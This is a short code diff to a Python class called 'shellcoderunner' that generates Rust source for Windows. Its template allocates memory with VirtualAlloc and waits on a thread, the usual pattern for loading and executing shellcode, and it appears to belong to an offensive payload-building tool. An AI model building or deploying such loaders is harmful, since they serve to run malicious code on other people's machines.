@@ -16,15 +16,11 @@ class shellcoderunner:
     def compilerOptions(self) -> list[str]:
         return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation"] }']
 
+    def codeblocks(self) -> str:
+        return """"""
+
     def template(self) -> str:
         return """
-{imports}
-
-{codeblocks}
-
-fn main() {{
-    
-    
     {transformers}
     unsafe {{
         let func_addr = VirtualAlloc(
@@ -47,5 +43,4 @@ fn main() {{
 
         WaitForSingleObject(h_thread, 0xFFFFFFFF); 
     }}
-}}
 """
